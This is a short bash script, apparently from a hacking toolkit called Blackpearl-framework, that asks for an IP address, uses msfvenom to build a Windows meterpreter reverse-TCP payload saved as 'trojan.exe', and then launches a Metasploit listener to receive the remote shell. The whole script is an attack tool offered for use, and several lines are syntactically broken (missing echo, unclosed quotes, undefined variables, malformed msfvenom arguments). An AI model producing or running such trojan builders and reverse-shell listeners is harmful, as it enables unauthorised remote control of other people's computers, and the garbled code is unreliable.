#!/bin/bash 

r='\e[1;31m' 

echo -e "DISCLAIMER : USE THIS WITH YOUR OWN RISK" 

clear 

read -p $R"IP :" ip

echo 

echo -e $r"Making payload"

msfvenom windows/meterpreter/reverse_tcp LHOST=$ip LPORT=6666 x > /sdcard/trojan.exe

echo

g"~~~~~~~~~~~~~~~~~~~~~~~~~"

echo -e $g"YOUR PAYLOAD IS SAVED IN SDCARD"

echo -e $c"\

echo -e $c"  *WAITING FOR REMOTE LISTENER*

echo -e $g"~~~~~~~~~~~~~~~~~~~~~~~~~"

echo -e $g" Opening metasploit meterpreter"

msfconsole -q -x "use exploit/multi/handler ; set payload windows/meterpreter/reverse_tcp ; set lhost $ip ; set lport 6666 ; exploit ;" 

echo 

echo

read -p $r "Press enter to go back" enter

cd Blackpearl-framework/lib

python msf.py
